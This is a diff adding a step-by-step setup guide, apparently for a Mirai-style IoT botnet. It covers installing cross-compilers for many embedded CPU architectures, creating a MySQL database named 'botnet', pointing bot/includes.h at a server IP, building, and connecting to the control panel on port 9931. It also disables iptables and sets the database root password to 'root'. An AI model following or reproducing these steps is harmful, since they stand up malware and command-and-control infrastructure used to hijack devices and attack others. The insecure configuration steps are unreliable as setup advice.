@@ -1,0 +1,80 @@
+[01]- Install pre-requirements
+Run these commands:
+ apt-get update -y
+ apt-get upgrade -y
+ apt-get install gcc snapd electric-fence sudo git -y
+ apt-get install mariadb-server -y
+ apt-get install nano make screen apache2 -y
+ snap install go --classic
+
+[02]- Download cross-compilers
+Run these commands:
+ mkdir /etc/xcompile
+ cd /etc/xcompile
+ 
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+ wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
+ 
+ tar -jxf cross-compiler-armv4l.tar.bz2
+ tar -jxf cross-compiler-i586.tar.bz2
+ tar -jxf cross-compiler-m68k.tar.bz2
+ tar -jxf cross-compiler-mips.tar.bz2
+ tar -jxf cross-compiler-mipsel.tar.bz2
+ tar -jxf cross-compiler-powerpc.tar.bz2
+ tar -jxf cross-compiler-sh4.tar.bz2
+ tar -jxf cross-compiler-sparc.tar.bz2
+ tar -jxf cross-compiler-armv6l.tar.bz2
+ 
+ rm *.tar.bz2
+ mv cross-compiler-armv4l armv4l
+ mv cross-compiler-i586 i586
+ mv cross-compiler-m68k m68k
+ mv cross-compiler-mips mips
+ mv cross-compiler-mipsel mipsel
+ mv cross-compiler-powerpc powerpc
+ mv cross-compiler-sh4 sh4
+ mv cross-compiler-sparc sparc
+ mv cross-compiler-armv6l armv6l
+
+ export PATH=$PATH:/etc/xcompile/armv4l/bin
+ export PATH=$PATH:/etc/xcompile/armv6l/bin
+ export PATH=$PATH:/etc/xcompile/i586/bin
+ export PATH=$PATH:/etc/xcompile/m68k/bin
+ export PATH=$PATH:/etc/xcompile/mips/bin
+ export PATH=$PATH:/etc/xcompile/mipsel/bin
+ export PATH=$PATH:/etc/xcompile/powerpc/bin
+ export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
+ export PATH=$PATH:/etc/xcompile/sh4/bin
+ export PATH=$PATH:/etc/xcompile/sparc/bin
+ export PATH=$PATH:/etc/xcompile/armv6l/bin
+ 
+[03]- Database Setup
+# If you have iptables rules, disable it:
+ iptables -F
+ service iptables stop
+ service ip6tables stop
+ 
+# now for actually setting up the database:
+type the command "mysql" and add -p<your password> if you have a mysql password set already
+
+# now paste these commands into your mysql terminal:
+
+ALTER USER 'root'@'localhost' IDENTIFIED BY 'root';
+flush privileges;
+CREATE DATABASE botnet;
+use botnet;
+source database.sql;
+exit;
+
+now edit your server ip (bot/includes.h)
+ 
+ 
+now cd ~/ && bash build.sh
+all done. connect to your server ip on port 9931.
